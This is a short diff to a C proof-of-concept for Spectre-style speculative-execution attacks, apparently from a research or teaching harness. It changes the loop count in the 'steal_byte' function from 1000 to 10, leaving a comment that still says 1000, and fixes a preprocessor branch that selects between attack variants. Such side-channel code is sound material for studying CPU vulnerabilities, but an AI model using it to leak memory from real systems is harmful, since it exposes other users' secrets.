@@ -180,7 +180,7 @@ void train_victim(){
 void steal_byte(int* scores, int larger_x){
 	uint64_t time_dif;
 	
-	for(int it = 0; it < 1000; it++){
+	for(int it = 0; it < 10; it++){
 		int success = 0;
 		for(uint8_t tryindex = 32; tryindex < 122; tryindex++){
 		
@@ -230,12 +230,12 @@ void steal_byte(int* scores, int larger_x){
 #else
 void steal_byte(int* scores, int larger_x){
 	// do the experiment 1000 Times
-	for(int it = 0; it < 1000; it++){
+	for(int it = 0; it < 10; it++){
 		train_victim();	
 		// access to the array speculatively
 		#ifdef __SPECTRE__V4
 		victim_function(larger_x >> 1);
-		#ifdef __SPECTRE__V9
+		#elif __SPECTRE__V9
 		victim_function(larger_x, x_is_unsafe);
 		#elif __SPECTRE__V11
 		victim_function(larger_x);
